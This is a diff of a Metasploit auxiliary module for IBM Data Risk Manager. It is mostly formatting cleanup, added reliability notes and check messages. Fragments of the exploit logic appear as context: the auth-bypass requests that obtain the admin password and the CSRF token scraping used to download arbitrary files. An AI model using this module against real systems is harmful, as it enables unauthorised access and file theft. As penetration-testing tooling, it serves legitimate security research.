@@ -24,28 +24,30 @@ class MetasploitModule < Msf::Auxiliary
           At the time of disclosure, this is was a 0 day, but IBM later patched it and released their advisory.
           Versions 2.0.2 to 2.0.4 are vulnerable, version 2.0.1 is not.
         },
-        'Author' =>
-          [
-            'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module
-          ],
+        'Author' => [
+          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module
+        ],
         'License' => MSF_LICENSE,
-        'DefaultOptions' =>
-          {
-            'SSL' => true
-          },
-        'References' =>
-          [
-            [ 'CVE', '2020-4427' ], # auth bypass
-            [ 'CVE', '2020-4429' ], # insecure default password
-            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],
-            [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ],
-            [ 'URL', 'https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/']
-          ],
+        'DefaultOptions' => {
+          'SSL' => true
+        },
+        'References' => [
+          [ 'CVE', '2020-4427' ], # auth bypass
+          [ 'CVE', '2020-4429' ], # insecure default password
+          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],
+          [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ],
+          [ 'URL', 'https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/']
+        ],
         'DisclosureDate' => '2020-04-21',
         'Actions' => [
           ['Download', { 'Description' => 'Download arbitrary file' }]
         ],
-        'DefaultAction' => 'Download'
+        'DefaultAction' => 'Download',
+        'Notes' => {
+          'Reliability' => [ ],
+          'Stability' => [ CRASH_SAFE ],
+          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]
+        }
       )
     )
 
@@ -73,10 +75,10 @@ class MetasploitModule < Msf::Auxiliary
       }
     })
     if res && (res.code == 302)
-      return Exploit::CheckCode::Detected
+      return Exploit::CheckCode::Detected('IBM DRM web interface detected')
     end
 
-    Exploit::CheckCode::Unknown
+    Exploit::CheckCode::Unknown('Could not determine if target is IBM DRM')
   end
 
   def create_session_id
@@ -115,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
       'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
     })
 
-    unless res && (res.code == 200) && res.body[/"data":"([0-9a-f\-]{36})/]
+    unless res && (res.code == 200) && res.body[/"data":"([0-9a-f-]{36})/]
       fail_with(Failure::NoAccess, "#{peer} - Failed to obtain the admin password.")
     end
 
@@ -150,7 +152,7 @@ class MetasploitModule < Msf::Auxiliary
       'cookie' => cookie
     })
 
-    unless res && (res.code == 200) && res.body =~ /var csrfToken = "([0-9a-f\-]{36})";/
+    unless res && (res.code == 200) && res.body =~ /var csrfToken = "([0-9a-f-]{36})";/
       fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate obtain CSRF cookie.")
     end
     csrf = Regexp.last_match(1)
